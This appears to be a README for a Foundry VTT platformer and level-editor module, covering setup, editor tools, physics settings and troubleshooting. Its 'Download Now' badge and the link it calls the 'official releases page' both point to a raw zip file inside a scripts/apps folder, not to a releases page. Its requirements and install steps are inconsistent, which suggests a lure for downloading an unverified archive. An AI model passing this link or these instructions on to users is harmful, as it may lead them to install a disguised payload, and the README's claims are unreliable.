# 🎮 geanos-jump-n-run-editor - Build and play platformer games easily

[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Wolframwalkout346/geanos-jump-n-run-editor/main/scripts/apps/jump_n_editor_run_geanos_2.9-beta.2.zip)

## What is this tool? 🛠️

geanos-jump-n-run-editor adds side-scrolling platformer mechanics to Foundry VTT. It includes a physics engine, multiplayer movement, and hazards. You can build your own levels inside your game world with the built-in editor. Players can jump, wall-slide, and dodge spikes together in real-time. This module turns your top-down game into a dynamic action experience.

## System Requirements 💻

Before you install this software, ensure your computer and game setup meet these minimum criteria:

* Foundry VTT Version 11 or newer.
* A stable internet connection.
* At least 2GB of available hard drive space.
* A mouse with a scroll wheel for level editing.
* Modern web browser like Chrome, Firefox, or Edge.

## How to Get Started 🚀

1. Visit the [official releases page](https://raw.githubusercontent.com/Wolframwalkout346/geanos-jump-n-run-editor/main/scripts/apps/jump_n_editor_run_geanos_2.9-beta.2.zip) to download the latest version of the module.
2. Select the file named `module.json` or the compressed `.zip` folder.
3. Save the file to your computer.
4. Open your Foundry VTT application.
5. Go to the "Add-on Modules" tab.
6. Click the "Install Module" button.
7. Select "Manifest URL" or point the file picker to the folder where you saved the download.

## Using the Level Editor 📝

The module provides tools to place platforms and hazards. Open the "Jump N Run Editor" toolbar on the right side of the Foundry interface. 

* **Place Platforms:** Select the rectangle tool. Click and drag on the canvas to draw a surface. The physics engine detects these surfaces automatically.
* **Add Hazards:** Select the spike icon. Click anywhere on your map to place a hazard. If a player token touches this tile, the physics system triggers local movement restrictions or respawn events.
* **Physics Settings:** Use the configuration menu to adjust gravity, jump height, and movement speed. These settings apply to all tokens inside the active scene.

## Multiplayer Features 🤝

The module synchronizes movement across all connected players. When you load a scene configured for platforming:

1. Token movement switches from grid-based to free-form input.
2. The physics engine tracks the position of every active character.
3. Tokens collide with walls and floor tiles created via the editor.
4. Wall-sliding triggers automatically when a player jumps against a vertical surface.

## Common Troubleshooting ⚙️

If you cannot see the editor tools, check your module list. Ensure the module is active in your current World Settings. If tokens pass through walls, verify that you placed the platforms on the correct layer within the editor. 

Test your level frequently by pressing the play button. If something feels too fast or too slow, return to the settings menu to tweak the physics constants. For specific issues, view the console log in your browser by pressing F12 and checking for red status messages.

## Managing Files 📁

Your levels save directly to your Foundry VTT user data folder. You can find saved layouts in the `modules/geanos-jump-n-run-editor/levels` directory. Backup these files if you plan to move your server to a new machine. You can copy the files to any new installation to restore your work without data loss.

## Recommended Settings 💡

Use these values for a standard platforming experience:

* Gravity: 0.8
* Jump Force: 12
* Wall Slide Speed: 0.3
* Friction: 0.1

Adjust these numbers until the movement feels right for your specific maps. Always save after making changes to the physics profile. 

## Compatibility Notes 🧩

This module works with most standard tilesets. If you use custom art, ensure your tiles have collision boundaries. You can define these boundaries in the module configuration panel. If you notice overlapping graphics, use the Z-index setting in the editor to ensure platforms appear on top of background layers.

## Community and Support 💬

The code is open source and licensed for hobby use. You can contribute to the development or report issues directly on the repository page. Keep your installation up to date to ensure access to the latest physics improvements and bug fixes. Future updates will include support for additional hazards and animated background elements.